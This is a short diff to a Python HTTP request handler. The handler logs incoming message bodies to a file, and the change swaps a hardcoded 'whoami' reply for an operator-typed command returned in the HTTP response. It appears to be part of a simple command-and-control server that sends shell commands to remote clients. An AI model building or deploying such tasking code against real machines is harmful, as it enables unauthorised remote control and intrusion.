@@ -38,7 +38,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
         with open('received_messages.txt', 'a') as file:
             file.write(message_body + '\n')
 
-        response_string = "whoami"
+        response_string = input("Enter command to be ran: ")
 
         # Set the response headers
         self.send_response(200)
